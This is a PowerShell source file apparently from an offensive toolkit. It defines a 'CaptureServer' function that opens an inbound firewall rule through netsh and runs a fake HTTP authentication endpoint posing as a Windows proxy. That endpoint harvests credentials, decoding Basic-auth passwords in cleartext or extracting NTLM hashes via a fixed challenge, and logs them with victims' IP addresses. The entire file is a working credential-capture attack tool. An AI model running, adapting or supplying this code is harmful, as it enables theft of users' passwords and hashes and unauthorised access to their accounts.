function CaptureServer
{

<#

admin privs required
Import-Module -Name C:\Users\pedro\Coding\redpill\CaptureServer.ps1 -Force
CaptureServer -AuthType Basic -IPAddress 192.168.1.72 -LogFilePath $env:tmp\log.txt


#>

    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        [ValidateSet("NTLM2","Basic")]
        $AuthType = "Basic",
        
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $IPAddress,

        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Port = 80,

        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $LogFilePath = "$pwd\requestlog.txt"

    )

function ExtractHash([string] $NTLMType3)
{

	$bytes = [System.Convert]::FromBase64String($NTLMType3)
	$bytes | foreach { $string = $string + $_.ToString("X2") }
	
	Write-Output $string.substring($string.length - 48, 48)
	
}


[byte[]]$NTLMType2 = 
	@(0x4e,0x54,0x4c,0x4d, 
	0x53,0x53,0x50,0x00,
	0x02,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,
	0x00,0x28,0x00,0x00,
	0x01,0x82,0x00,0x00,
	0x11,0x22,0x33,0x44,
	0x55,0x66,0x77,0x88,
	0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00)


    $PPID = $PID
    echo "$PPID"|Out-File -FilePath "$Env:TMP\mypid.log" -Encoding ascii -Force

    $listener = New-Object System.Net.HttpListener
    $URL = "http://"+$IPAddress+":"+$Port+"/"
    $listener.Prefixes.Add($URL) 

    netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
    netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null

    $listener.Start()
    Write-Output "Listening on $URL..."
    while ($true) {
        $context = $listener.GetContext() # blocks until request is received
        $request = $context.Request
        $response = $context.Response
	    $hostip = $request.RemoteEndPoint
	
	    $headers = $request.Headers
	    $message = ''

        if ($AuthType -eq "Basic")
        {
        $basic = $true
        }

	    foreach ($key in $headers.AllKeys)
	    {
		    if($key -match 'Authorization')
		    {
			    [string[]]$values = $headers.GetValues('Authorization')
			    #Write-Host $values[0] -fore Cyan

			    if ($basic)
                {
                    $NTLMAuthentication = $values[0] -split "\s+"
                    $creds = ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String( $NTLMAuthentication[1])))
                    Write-Host "`ncaptured credentials" -ForegroundColor Green
                    Write-Output "--------------------"
                    Write-Output $context.Request.RemoteEndPoint.Address.IPAddressToString
                    Write-Output $creds
                    Out-File -FilePath $LogFilePath -InputObject $context.Request.RemoteEndPoint.Address.IPAddressToString -Append
                    Out-File -FilePath $LogFilePath -InputObject $creds -Append
                }
                else
                {
                    $NTLMAuthentication = $values[0] -split "\s+"
			        Write-Output $context.Request.RemoteEndPoint.Address.IPAddressToString
                    #Write-Output $NTLMAuthentication[1]
			        $NTLMType = $NTLMAuthentication[1]
			        $hash = ExtractHash($NTLMType)
                    Write-Output $hash
                    Out-File -FilePath $LogFilePath -InputObject $context.Request.RemoteEndPoint.Address.IPAddressToString -Append
                    Out-File -FilePath $LogFilePath -InputObject $hash -Append
                    Out-File -FilePath $LogFilePath -InputObject ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($NTLMType))) -Append
                    $ntlmt2 = $true
                }
		    }
		
		
        }		
	
	    if($ntlmt2)
	    {
		    $NTLMType2Response = 'NTLM ' + [Convert]::ToBase64String($NTLMType2)
		    $response.AddHeader('WWW-Authenticate', $NTLMType2Response)
		    $response.AddHeader("Content-Type","text/html")
		    $response.StatusCode = 401
		    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
		    $response.ContentLength64 = $buffer.length
		    $output = $response.OutputStream
		    $output.Write($buffer, 0, $buffer.length)
		    $output.Close()
		    continue
        }

        elseif($basic)
        {
            $response.AddHeader('WWW-Authenticate', 'Basic')
		    $response.AddHeader("Content-Type","text/html")
            $response.AddHeader("Host","InternetGateway")
		    $response.StatusCode = 401
        

		    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes("Win Proxy")
		    $response.ContentLength64 = $buffer.length
		    $output = $response.OutputStream
		    $output.Write($buffer, 0, $buffer.length)
		    $output.Close()
		    continue
        }

	    else
	    {
		    $response.AddHeader('WWW-Authenticate', 'NTLM')
		    $response.AddHeader('Content-Type','text/html')
		    $response.StatusCode = 401
		

		    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
		    $response.ContentLength64 = $buffer.length
		    $output = $response.OutputStream
		    $output.Write($buffer, 0, $buffer.length)
		    $output.Close()
		    continue
	    }
		
    }

    $listener.Stop()
    Stop-Process -Id $PPID -Force
}
